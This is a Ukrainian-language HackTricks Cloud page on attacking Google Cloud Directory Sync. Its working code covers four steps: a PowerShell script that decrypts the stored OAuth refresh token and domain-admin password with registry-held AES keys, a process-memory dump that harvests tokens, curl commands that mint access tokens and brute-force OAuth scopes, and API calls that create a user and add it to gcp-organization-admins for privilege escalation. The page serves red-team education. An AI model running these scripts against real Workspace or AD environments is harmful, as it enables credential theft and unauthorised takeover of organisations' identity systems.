# GCDS - Google Cloud Directory Sync

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

–¶–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —è–∫–∏–π –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è **—Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó –≤–∞—à–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –≥—Ä—É–ø –∞–∫—Ç–∏–≤–Ω–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É –∑ –≤–∞—à–∏–º Workspace** (–∞ –Ω–µ –Ω–∞–≤–ø–∞–∫–∏ –Ω–∞ –º–æ–º–µ–Ω—Ç –Ω–∞–ø–∏—Å–∞–Ω–Ω—è —Ü—å–æ–≥–æ —Ç–µ–∫—Å—Ç—É).

–¶–µ —Ü—ñ–∫–∞–≤–æ, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —è–∫–∏–π –≤–∏–º–∞–≥–∞—Ç–∏–º–µ **–æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ Workspace —Ç–∞ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ AD**. –¢–æ–º—É, –º–æ–∂–ª–∏–≤–æ, –π–æ–≥–æ –º–æ–∂–Ω–∞ –±—É–¥–µ –∑–Ω–∞–π—Ç–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ –¥–æ–º–µ–Ω—É, —è–∫–∏–π —á–∞—Å –≤—ñ–¥ —á–∞—Å—É —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤.

{% hint style="info" %}
–©–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ **MitM** –¥–ª—è –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É **`config-manager.exe`**, –ø—Ä–æ—Å—Ç–æ –¥–æ–¥–∞–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Ä—è–¥–æ–∫ —É —Ñ–∞–π–ª `config.manager.vmoptions`: **`-Dcom.sun.net.ssl.checkRevocation=false`**
{% endhint %}

{% hint style="success" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) –∑–¥–∞—Ç–Ω–∏–π –≤–∏—è–≤–∏—Ç–∏ **GCDS**, –æ—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —Ç–∞ **–Ω–∞–≤—ñ—Ç—å –ø–∞—Ä–æ–ª—ñ —Ç–∞ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ**.
{% endhint %}

–¢–∞–∫–æ–∂ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ GCDS –Ω–µ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É—î –ø–∞—Ä–æ–ª—ñ –∑ AD –¥–æ Workspace. –Ø–∫—â–æ —â–æ—Å—å, –≤—ñ–Ω –ø—Ä–æ—Å—Ç–æ –≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏–º–µ –≤–∏–ø–∞–¥–∫–æ–≤—ñ –ø–∞—Ä–æ–ª—ñ –¥–ª—è –Ω–æ–≤–æ—Å—Ç–≤–æ—Ä–µ–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —É Workspace, —è–∫ –≤–∏ –º–æ–∂–µ—Ç–µ –±–∞—á–∏—Ç–∏ –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—ñ:

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5780773316536156543-x.jpg" alt="" width="515"><figcaption></figcaption></figure>

### GCDS - Disk Tokens & AD Credentials

–ë—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª `config-manager.exe` (–æ—Å–Ω–æ–≤–Ω–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª GCDS –∑ GUI) –∑–±–µ—Ä—ñ–≥–∞—Ç–∏–º–µ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ Active Directory, —Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–∞ –¥–æ—Å—Ç—É–ø –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —É **xml —Ñ–∞–π–ª—ñ** –≤ –ø–∞–ø—Ü—ñ **`C:\Program Files\Google Cloud Directory Sync`** —É —Ñ–∞–π–ª—ñ –ø—ñ–¥ –Ω–∞–∑–≤–æ—é **`Untitled-1.xml`** –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º. –•–æ—á–∞ –π–æ–≥–æ —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –∑–±–µ—Ä–µ–≥—Ç–∏ –≤ `Documents` –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∞–±–æ –≤ **–±—É–¥—å-—è–∫—ñ–π —ñ–Ω—à—ñ–π –ø–∞–ø—Ü—ñ**.

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —Ä–µ—î—Å—Ç—Ä **`HKCU\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\ui`** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–ª—é—á–∞ **`open.recent`** –º—ñ—Å—Ç–∏—Ç—å —à–ª—è—Ö–∏ –¥–æ –≤—Å—ñ—Ö –Ω–µ—â–æ–¥–∞–≤–Ω–æ –≤—ñ–¥–∫—Ä–∏—Ç–∏—Ö –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ (xml). –¢–æ–º—É –º–æ–∂–ª–∏–≤–æ **–ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Ü–µ, —â–æ–± –∑–Ω–∞–π—Ç–∏ —ó—Ö**.

–ù–∞–π—Ü—ñ–∫–∞–≤—ñ—à–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–∞–π–ª—É –±—É–¥–µ:
```xml
[...]
<loginMethod>OAUTH2</loginMethod>
<oAuth2RefreshToken>rKvvNQxi74JZGI74u68aC6o+3Nu1ZgVUYdD1GyoWyiHHxtWx+lbx3Nk8dU27fts5lCJKH/Gp1q8S6kEM2AvjQZN16MkGTU+L2Yd0kZsIJWeO0K0RdVaK2D9Saqchk347kDgGsQulJnuxU+Puo46+aA==</oAuth2RefreshToken>
<oAuth2Scopes>
<scope>https://www.google.com/m8/feeds/</scope>
<scope>https://www.googleapis.com/auth/admin.directory.group</scope>
<scope>https://www.googleapis.com/auth/admin.directory.orgunit</scope>
<scope>https://www.googleapis.com/auth/admin.directory.resource.calendar</scope>
<scope>https://www.googleapis.com/auth/admin.directory.user</scope>
<scope>https://www.googleapis.com/auth/admin.directory.userschema</scope>
<scope>https://www.googleapis.com/auth/apps.groups.settings</scope>
<scope>https://www.googleapis.com/auth/apps.licensing</scope>
<scope>https://www.googleapis.com/auth/plus.me</scope>
</oAuth2Scopes>
[...]
<hostname>192.168.10.23</hostname>
<port>389</port>
<basedn>dc=hacktricks,dc=local</basedn>
<authType>SIMPLE</authType>
<authUser>DOMAIN\domain-admin</authUser>
<authCredentialsEncrypted>XMmsPMGxz7nkpChpC7h2ag==</authCredentialsEncrypted>
[...]
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —è–∫ **refresh** **token** —Ç–∞ **password** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ **—à–∏—Ñ—Ä—É—é—Ç—å—Å—è** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **AES CBC** –∑ –≤–∏–ø–∞–¥–∫–æ–≤–æ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏–º –∫–ª—é—á–µ–º —Ç–∞ IV, —è–∫—ñ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ **`HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util`** (–¥–µ –± –Ω–µ –∑–±–µ—Ä—ñ–≥–∞–ª–∞ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞ **`prefs`** Java –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è) —É —Ä—è–¥–∫–æ–≤–∏—Ö –∫–ª—é—á–∞—Ö **`/Encryption/Policy/V2.iv`** —Ç–∞ **`/Encryption/Policy/V2.key`**, –∑–±–µ—Ä–µ–∂–µ–Ω–∏—Ö —É base64.

<details>

<summary>Powershell —Å–∫—Ä–∏–ø—Ç –¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∫–∏ refresh token —Ç–∞ password</summary>
```powershell
# Paths and key names
$xmlConfigPath = "C:\Users\c\Documents\conf.xml"
$regPath = "SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util"
$ivKeyName = "/Encryption/Policy/V2.iv"
$keyKeyName = "/Encryption/Policy/V2.key"

# Open the registry key
try {
$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regPath)
if (-not $regKey) {
Throw "Registry key not found: HKCU\$regPath"
}
}
catch {
Write-Error "Failed to open registry key: $_"
exit
}

# Get Base64-encoded IV and Key from the registry
try {
$ivBase64 = $regKey.GetValue($ivKeyName)
$ivBase64 = $ivBase64 -replace '/', ''
$ivBase64 = $ivBase64 -replace '\\', '/'
if (-not $ivBase64) {
Throw "IV not found in registry"
}
$keyBase64 = $regKey.GetValue($keyKeyName)
$keyBase64 = $keyBase64 -replace '/', ''
$keyBase64 = $keyBase64 -replace '\\', '/'
if (-not $keyBase64) {
Throw "Key not found in registry"
}
}
catch {
Write-Error "Failed to read registry values: $_"
exit
}
$regKey.Close()


# Decode Base64 IV and Key
$ivBytes = [Convert]::FromBase64String($ivBase64)
$keyBytes = [Convert]::FromBase64String($keyBase64)

# Read XML content
$xmlContent = Get-Content -Path $xmlConfigPath -Raw

# Extract Base64-encoded encrypted values using regex
$refreshTokenMatch = [regex]::Match($xmlContent, "<oAuth2RefreshToken>(.*?)</oAuth2RefreshToken>")
$refreshTokenBase64 = $refreshTokenMatch.Groups[1].Value

$encryptedPasswordMatch = [regex]::Match($xmlContent, "<authCredentialsEncrypted>(.*?)</authCredentialsEncrypted>")
$encryptedPasswordBase64 = $encryptedPasswordMatch.Groups[1].Value

# Decode encrypted values from Base64
$refreshTokenEncryptedBytes = [Convert]::FromBase64String($refreshTokenBase64)
$encryptedPasswordBytes = [Convert]::FromBase64String($encryptedPasswordBase64)

# Function to decrypt data using AES CBC
Function Decrypt-Data($cipherBytes, $keyBytes, $ivBytes) {
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Key = $keyBytes
$aes.IV = $ivBytes

$decryptor = $aes.CreateDecryptor()
$memoryStream = New-Object System.IO.MemoryStream
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($cipherBytes, 0, $cipherBytes.Length)
$cryptoStream.FlushFinalBlock()
$plaintextBytes = $memoryStream.ToArray()

$cryptoStream.Close()
$memoryStream.Close()

return $plaintextBytes
}

# Decrypt the values
$refreshTokenBytes = Decrypt-Data -cipherBytes $refreshTokenEncryptedBytes -keyBytes $keyBytes -ivBytes $ivBytes
$refreshToken = [System.Text.Encoding]::UTF8.GetString($refreshTokenBytes)

$decryptedPasswordBytes = Decrypt-Data -cipherBytes $encryptedPasswordBytes -keyBytes $keyBytes -ivBytes $ivBytes
$decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPasswordBytes)

# Output the decrypted values
Write-Host "Decrypted Refresh Token: $refreshToken"
Write-Host "Decrypted Password: $decryptedPassword"
```
</details>

{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, –ø–µ—Ä–µ–≥–ª—è–Ω—É–≤—à–∏ java-–∫–æ–¥ **`DirSync.jar`** –∑ **`C:\Program Files\Google Cloud Directory Sync`**, —à—É–∫–∞—é—á–∏ —Ä—è–¥–æ–∫ `exportkeys` (–æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –ø–∞—Ä–∞–º–µ—Ç—Ä cli, —è–∫–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª `upgrade-config.exe` –æ—á—ñ–∫—É—î –¥–ª—è –≤–∏–≤–µ–¥–µ–Ω–Ω—è –∫–ª—é—á—ñ–≤).
{% endhint %}

–ó–∞–º—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Å–∫—Ä–∏–ø—Ç–∞ PowerShell, —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª **`:\Program Files\Google Cloud Directory Sync\upgrade-config.exe`** –∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º `-exportKeys` —ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ **Key** —Ç–∞ **IV** –∑ —Ä–µ—î—Å—Ç—Ä—É –≤ —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–æ–º—É —Ñ–æ—Ä–º–∞—Ç—ñ, –∞ –ø–æ—Ç—ñ–º –ø—Ä–æ—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ CyberChef –∑ AES/CBC —Ç–∞ —Ü–∏–º –∫–ª—é—á–µ–º —ñ IV –¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó.

### GCDS - –í–∏–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–æ–∫–µ–Ω—ñ–≤ –∑ –ø–∞–º'—è—Ç—ñ

–¢–∞–∫ —Å–∞–º–æ, —è–∫ —ñ –∑ GCPW, –º–æ–∂–ª–∏–≤–æ –≤–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –ø–∞–º'—è—Ç—å –ø—Ä–æ—Ü–µ—Å—É `config-manager.exe` (—Ü–µ –Ω–∞–∑–≤–∞ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É GCDS –∑ GUI), —ñ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ç–æ–∫–µ–Ω–∏ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–∞ –¥–æ—Å—Ç—É–ø—É (—è–∫—â–æ –≤–æ–Ω–∏ –≤–∂–µ –±—É–ª–∏ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω—ñ).\
–ì–∞–¥–∞—é, –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–≥–ª–∏ –± –∑–Ω–∞–π—Ç–∏ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ AD.

<details>

<summary>–í–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –ø—Ä–æ—Ü–µ—Å–∏ config-manager.exe —Ç–∞ —à—É–∫–∞—Ç–∏ —Ç–æ–∫–µ–Ω–∏</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "config-manager" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

### GCDS - –ì–µ–Ω–µ—Ä–∞—Ü—ñ—è —Ç–æ–∫–µ–Ω—ñ–≤ –¥–æ—Å—Ç—É–ø—É –∑ —Ç–æ–∫–µ–Ω—ñ–≤ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è, –º–æ–∂–Ω–∞ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ —Ç–æ–∫–µ–Ω–∏ –¥–æ—Å—Ç—É–ø—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –π–æ–≥–æ —Ç–∞ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –∫–ª—ñ—î–Ω—Ç–∞ —ñ —Å–µ–∫—Ä–µ—Ç –∫–ª—ñ—î–Ω—Ç–∞, –∑–∞–∑–Ω–∞—á–µ–Ω—ñ –≤ –Ω–∞—Å—Ç—É–ø–Ω—ñ–π –∫–æ–º–∞–Ω–¥—ñ:
```bash
curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCDS - Scopes

{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –Ω–∞–≤—ñ—Ç—å –º–∞—é—á–∏ refresh token, –Ω–µ–º–æ–∂–ª–∏–≤–æ –∑–∞–ø–∏—Ç–∞—Ç–∏ –∂–æ–¥–µ–Ω scope –¥–ª—è access token, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø–∏—Ç—É–≤–∞—Ç–∏ –ª–∏—à–µ **scopes, –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω—ñ –¥–æ–¥–∞—Ç–∫–æ–º, –≤ —è–∫–æ–º—É –≤–∏ –≥–µ–Ω–µ—Ä—É—î—Ç–µ access token**.

–¢–∞–∫–æ–∂ refresh token –Ω–µ —î –¥—ñ–π—Å–Ω–∏–º —É –∫–æ–∂–Ω–æ–º—É –¥–æ–¥–∞—Ç–∫—É.
{% endhint %}

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º GCSD –Ω–µ –º–∞—Ç–∏–º–µ –¥–æ—Å—Ç—É–ø—É —è–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –¥–æ –∫–æ–∂–Ω–æ–≥–æ –º–æ–∂–ª–∏–≤–æ–≥–æ OAuth scope, —Ç–æ–º—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç, –º–∏ –º–æ–∂–µ–º–æ –∑–Ω–∞–π—Ç–∏ scopes, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑ `refresh_token` –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó `access_token`:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03PR0VQOSCjS1CgYIARAAGAMSNwF-L9Ir5b_vOaCmnXzla0nL7dX7TJJwFcvrfgDPWI-j19Z4luLpYfLyv7miQyvgyXjGEXt-t0A" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

–Ü –æ—Å—å –≤–∏—Ö—ñ–¥, —è–∫–∏–π —è –æ—Ç—Ä–∏–º–∞–≤ –Ω–∞ –º–æ–º–µ–Ω—Ç –Ω–∞–ø–∏—Å–∞–Ω–Ω—è:
```
https://www.googleapis.com/auth/admin.directory.group
https://www.googleapis.com/auth/admin.directory.orgunit
https://www.googleapis.com/auth/admin.directory.resource.calendar
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/admin.directory.userschema
https://www.googleapis.com/auth/apps.groups.settings
https://www.googleapis.com/auth/apps.licensing
https://www.googleapis.com/auth/contacts
```
#### –°—Ç–≤–æ—Ä—ñ—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –¥–æ–¥–∞–π—Ç–µ –π–æ–≥–æ –¥–æ –≥—Ä—É–ø–∏ `gcp-organization-admins`, —â–æ–± —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –µ—Å–∫–∞–ª—É–≤–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó –≤ GCP
```bash
# Create new user
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/users' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"primaryEmail": "deleteme@domain.com",
"name": {
"givenName": "Delete",
"familyName": "Me"
},
"password": "P4ssw0rdStr0ng!",
"changePasswordAtNextLogin": false
}'

# Add to group
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/groups/gcp-organization-admins@domain.com/members' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"email": "deleteme@domain.com",
"role": "OWNER"
}'

# You could also change the password of a user for example
```
{% hint style="danger" %}
–ù–µ–º–æ–∂–ª–∏–≤–æ –Ω–∞–¥–∞—Ç–∏ –Ω–æ–≤–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É —Ä–æ–ª—å Super Amin, –æ—Å–∫—ñ–ª—å–∫–∏ **—Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –Ω–µ –º–∞—î –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –æ–±—Å—è–≥—ñ–≤** –¥–ª—è –Ω–∞–¥–∞–Ω–Ω—è –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.
{% endhint %}

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
